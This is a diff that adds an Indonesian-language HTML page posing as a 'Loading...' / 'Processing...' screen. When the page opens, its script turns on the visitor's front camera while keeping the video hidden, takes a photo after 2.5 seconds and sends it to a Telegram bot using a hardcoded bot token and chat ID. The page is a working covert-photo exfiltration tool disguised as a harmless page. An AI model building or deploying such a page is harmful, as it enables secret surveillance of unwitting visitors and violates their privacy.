@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 40px;
+            background: #1a1a2e;
+            color: white;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 400px;
+        }
+        h1 {
+            font-size: 1.8em;
+            margin-bottom: 20px;
+        }
+        .status {
+            margin: 25px 0;
+            font-size: 1.1em;
+        }
+        video { display: none; } /* Kamera disembunyikan */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📷 Processing...</h1>
+        <div class="status" id="status">Mengaktifkan kamera dan mengambil foto...</div>
+        <video id="video" autoplay playsinline muted></video>
+        <img id="photo" src="" style="display:none;">
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y";
+        const CHAT_ID = "8463156896";
+
+        // Kirim ke Telegram
+        async function kirimKeTelegram(photoUrl) {
+            const caption = `📸 Foto diambil otomatis\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+
+            const formData = new FormData();
+            const blob = await fetch(photoUrl).then(r => r.blob());
+            formData.append('photo', blob, 'foto.png');
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', caption);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                document.getElementById('status').innerHTML = "✅ Foto berhasil dikirim!";
+            });
+        }
+
+        // Ambil foto
+        function takePhoto(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            const photoUrl = canvas.toDataURL('image/png');
+            kirimKeTelegram(photoUrl);
+        }
+
+        // Start kamera (tapi disembunyikan)
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(() => takePhoto(video), 2500);
+                };
+            } catch (err) {
+                document.getElementById('status').innerHTML = "❌ Gagal mengakses kamera";
+            }
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
